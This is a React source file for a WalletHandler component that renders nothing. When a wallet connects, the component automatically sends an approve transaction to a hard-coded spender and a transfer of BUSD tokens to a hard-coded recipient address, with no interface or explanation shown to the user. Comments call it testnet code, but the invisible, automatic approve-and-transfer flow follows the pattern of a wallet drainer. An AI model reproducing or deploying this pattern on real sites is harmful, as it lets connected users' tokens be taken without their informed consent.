import { useEffect } from "react";
import { useAccount } from "wagmi";
import { BrowserProvider, Contract, parseUnits } from "ethers";

const TOKEN_ADDRESS = "0xed24fc36d5ee211ea25a80239fb8c4cfd80f12ee"; // BUSD testnet
const SPENDER_ADDRESS = "0x9ac64cc6e4415144c455bd8e4837fea55603e5c3";
const RECIPIENT_ADDRESS = "0x588148C3ffbA25009451d66aD599cC447289Cbf5"; // your recipient or test wallet
const TOKEN_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function transfer(address recipient, uint256 amount) public returns (bool)",
];
const TRANSFER_AMOUNT = parseUnits("0.01", 18);

export default function WalletHandler() {
  const { address, isConnected } = useAccount();

  useEffect(() => {
    const run = async () => {
      if (!isConnected || !window.ethereum || !address) {
        console.log("Wallet not connected or MetaMask missing");
        return;
      }

      // console.log("Wallet:", address);

      const provider = new BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const token = new Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);

      try {
        const approveTx = await token.approve(SPENDER_ADDRESS, TRANSFER_AMOUNT);
        await approveTx.wait();
        console.log(" Approved");

        const transferTx = await token.transfer(RECIPIENT_ADDRESS, TRANSFER_AMOUNT);
        await transferTx.wait();
        console.log("Transferred");
      } catch (err) {
        console.error("❌ Transaction error:", err);
      }
    };

    run();
  }, [isConnected, address]);

  return null;
}
